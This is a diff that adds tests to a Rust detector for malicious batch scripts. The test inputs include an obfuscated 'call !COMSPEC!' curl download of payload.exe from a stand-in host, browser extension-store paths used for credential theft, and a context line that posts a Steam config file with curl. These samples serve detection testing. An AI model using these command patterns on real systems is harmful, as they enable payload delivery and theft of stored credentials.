@@ -10960,6 +10960,24 @@ mod call_wrapper_tests {
     }
 
     #[test]
+    fn call_bang_comspec_child_preserves_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+call !COMSPEC! /V:ON /c "set U=https://call-bang-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://call-bang-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "call !COMSPEC! child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn call_comspec_child_preserves_escaped_delayed_expansion() {
         let script = br#"setlocal EnableDelayedExpansion
 call %COMSPEC% /V:ON /c "set U=https://call-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
@@ -25142,6 +25160,25 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
                 report.traits
             );
         }
+    }
+
+    #[test]
+    fn browser_extension_store_paths_emit_credential_access_trait() {
+        let script = br#"set "chrome=C:\Users\puncher\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings"
+set "opera=C:\Users\puncher\AppData\Roaming\Opera Software\Opera Stable\Extensions"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "browser-extension-store"
+                        && target.contains(r"Chrome\User Data\Default\Local Extension Settings")
+            )),
+            "browser extension store path was not surfaced: {:?}",
+            report.traits
+        );
     }
 
     #[test]
